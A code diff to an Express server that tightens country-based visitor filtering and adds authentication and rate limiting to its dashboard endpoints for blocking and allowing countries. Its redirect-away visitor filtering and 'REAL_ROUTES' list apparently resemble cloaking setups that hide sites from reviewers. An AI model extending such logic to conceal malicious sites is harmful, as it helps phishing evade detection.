@@ -14,6 +14,8 @@ const app = express();
 const http = require('http').createServer(app);
 const io = new Server(http);
 
+const redirectURL = process.env.URL; // Replace with your desired redirect URL
+
 // Socket.io connection handling
 io.on('connection', (socket) => {
   console.log('New client connected:', socket.id);
@@ -206,6 +208,7 @@ const globalSettings = {
   blockedCountries: [],
   allowedCountries: [],
   countryFilterMode: 'block', // 'block' or 'allow-only'
+  countryRedirectUrl: redirectURL || 'https://google.com' // Default redirect URL for country filtering
 };
 
 // Parse User Agent function
@@ -245,7 +248,7 @@ function parseUserAgent(userAgent) {
   return { browser, os };
 }
 
-const redirectURL = process.env.URL; // Replace with your desired redirect URL
+
 
 const REAL_ROUTES = [
   "/",
@@ -887,20 +890,31 @@ async function detectMiddleware(req, res, next) {
   }
   
   // 4. Country filtering logic
-  if (visitorData && visitorData.country) {
+  if (visitorData) {
     const countryCode = visitorData.country;
     
     // Apply country filtering based on mode
     if (globalSettings.countryFilterMode === 'block') {
       // Block mode: block countries in the list
-      if (globalSettings.blockedCountries.includes(countryCode)) {
+      if (countryCode && globalSettings.blockedCountries && globalSettings.blockedCountries.includes(countryCode)) {
         console.log(`Blocked country accessed: ${countryCode} from ${clientIp}`);
         return res.redirect(targetUrl);
       }
+      // If no country is blocked or country is unknown, allow access
+      // This is the default behavior for block mode
     } else {
       // Allow-only mode: only allow countries in the list
-      if (!globalSettings.allowedCountries.includes(countryCode)) {
-        console.log(`Non-allowed country accessed: ${countryCode} from ${clientIp}`);
+      // First check if we have any allowed countries configured
+      if (globalSettings.allowedCountries && globalSettings.allowedCountries.length > 0) {
+        // If country is unknown or not in the allowed list, block access
+        if (!countryCode || !globalSettings.allowedCountries.includes(countryCode)) {
+          console.log(`Non-allowed country accessed: ${countryCode || 'Unknown'} from ${clientIp}`);
+          return res.redirect(targetUrl);
+        }
+        // Country is in the allowed list, so allow access
+      } else {
+        // No countries are explicitly allowed, so block all
+        console.log(`No allowed countries configured, blocking access from ${countryCode || 'Unknown'} (${clientIp})`);
         return res.redirect(targetUrl);
       }
     }
@@ -1287,39 +1301,146 @@ app.post("/dashboard/unblock", (req, res) => {
 });
 
 // Block country endpoint
-app.post('/dashboard/block-country', (req, res) => {
+app.post('/dashboard/block-country', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
   const { countryCode } = req.body;
-  if (countryCode && !globalSettings.blockedCountries.includes(countryCode)) {
-    globalSettings.blockedCountries.push(countryCode);
+  
+  // Validate country code (must be 2 letters)
+  if (!countryCode || typeof countryCode !== 'string' || countryCode.length !== 2) {
+    return res.json({ success: false, message: 'Invalid country code format' });
   }
-  res.json({ success: true, countries: globalSettings.blockedCountries });
-});
-
-app.post('/dashboard/unblock-country', (req, res) => {
-  const { countryCode } = req.body;
-  globalSettings.blockedCountries = globalSettings.blockedCountries.filter(c => c !== countryCode);
-  res.json({ success: true, countries: globalSettings.blockedCountries });
-});
-
-app.post('/dashboard/allow-country', (req, res) => {
-  const { countryCode } = req.body;
-  if (countryCode && !globalSettings.allowedCountries.includes(countryCode)) {
-    globalSettings.allowedCountries.push(countryCode);
+  
+  // Standardize to uppercase
+  const formattedCode = countryCode.toUpperCase();
+  
+  // Check if already in the list
+  if (!globalSettings.blockedCountries.includes(formattedCode)) {
+    globalSettings.blockedCountries.push(formattedCode);
+    console.log(`Added ${formattedCode} to blocked countries list`);
   }
-  res.json({ success: true, countries: globalSettings.allowedCountries });
-});
-
-app.post('/dashboard/disallow-country', (req, res) => {
-  const { countryCode } = req.body;
-  globalSettings.allowedCountries = globalSettings.allowedCountries.filter(c => c !== countryCode);
-  res.json({ success: true, countries: globalSettings.allowedCountries });
-});
-
-app.post('/dashboard/toggle-country-mode', (req, res) => {
-  const { allowMode } = req.body;
-  globalSettings.countryFilterMode = allowMode ? 'allow-only' : 'block';
+  
+  // Notify all dashboard clients about the update
+  io.emit('dashboard-update');
+  
   res.json({ 
     success: true, 
+    message: `Country ${formattedCode} added to blocked list`,
+    countries: globalSettings.blockedCountries 
+  });
+});
+
+app.post('/dashboard/unblock-country', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+  const { countryCode } = req.body;
+  
+  // Validate country code
+  if (!countryCode || typeof countryCode !== 'string') {
+    return res.json({ success: false, message: 'Invalid country code' });
+  }
+  
+  // Standardize to uppercase
+  const formattedCode = countryCode.toUpperCase();
+  
+  // Remove from blocked list
+  const initialLength = globalSettings.blockedCountries.length;
+  globalSettings.blockedCountries = globalSettings.blockedCountries.filter(c => c !== formattedCode);
+  
+  // Check if anything was removed
+  const wasRemoved = initialLength > globalSettings.blockedCountries.length;
+  
+  if (wasRemoved) {
+    console.log(`Removed ${formattedCode} from blocked countries list`);
+    // Notify all dashboard clients about the update
+    io.emit('dashboard-update');
+  }
+  
+  res.json({ 
+    success: true, 
+    message: wasRemoved ? `Country ${formattedCode} removed from blocked list` : `Country ${formattedCode} was not in blocked list`,
+    countries: globalSettings.blockedCountries 
+  });
+});
+
+app.post('/dashboard/allow-country', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+  const { countryCode } = req.body;
+  
+  // Validate country code (must be 2 letters)
+  if (!countryCode || typeof countryCode !== 'string' || countryCode.length !== 2) {
+    return res.json({ success: false, message: 'Invalid country code format' });
+  }
+  
+  // Standardize to uppercase
+  const formattedCode = countryCode.toUpperCase();
+  
+  // Check if already in the list
+  if (!globalSettings.allowedCountries.includes(formattedCode)) {
+    globalSettings.allowedCountries.push(formattedCode);
+    console.log(`Added ${formattedCode} to allowed countries list`);
+  }
+  
+  // Notify all dashboard clients about the update
+  io.emit('dashboard-update');
+  
+  res.json({ 
+    success: true, 
+    message: `Country ${formattedCode} added to allowed list`,
+    countries: globalSettings.allowedCountries 
+  });
+});
+
+app.post('/dashboard/disallow-country', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+  const { countryCode } = req.body;
+  
+  // Validate country code
+  if (!countryCode || typeof countryCode !== 'string') {
+    return res.json({ success: false, message: 'Invalid country code' });
+  }
+  
+  // Standardize to uppercase
+  const formattedCode = countryCode.toUpperCase();
+  
+  // Remove from allowed list
+  const initialLength = globalSettings.allowedCountries.length;
+  globalSettings.allowedCountries = globalSettings.allowedCountries.filter(c => c !== formattedCode);
+  
+  // Check if anything was removed
+  const wasRemoved = initialLength > globalSettings.allowedCountries.length;
+  
+  if (wasRemoved) {
+    console.log(`Removed ${formattedCode} from allowed countries list`);
+    // Notify all dashboard clients about the update
+    io.emit('dashboard-update');
+  }
+  
+  res.json({ 
+    success: true, 
+    message: wasRemoved ? `Country ${formattedCode} removed from allowed list` : `Country ${formattedCode} was not in allowed list`,
+    countries: globalSettings.allowedCountries 
+  });
+});
+
+app.post('/dashboard/toggle-country-mode', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+  const { allowMode } = req.body;
+  
+  // Validate input
+  if (allowMode === undefined) {
+    return res.json({ success: false, message: 'Missing allowMode parameter' });
+  }
+  
+  // Convert to boolean if string
+  const newMode = allowMode === true || allowMode === 'true';
+  const oldMode = globalSettings.countryFilterMode === 'allow-only';
+  
+  // Only update if there's a change
+  if (newMode !== oldMode) {
+    globalSettings.countryFilterMode = newMode ? 'allow-only' : 'block';
+    console.log(`Country filter mode changed to: ${globalSettings.countryFilterMode}`);
+    
+    // Notify all dashboard clients about the update
+    io.emit('dashboard-update');
+  }
+  
+  res.json({ 
+    success: true, 
+    message: `Country filter mode set to ${newMode ? 'Allow Only' : 'Block'} mode`,
     mode: globalSettings.countryFilterMode,
     countries: globalSettings.countryFilterMode === 'block' ? globalSettings.blockedCountries : globalSettings.allowedCountries
   });
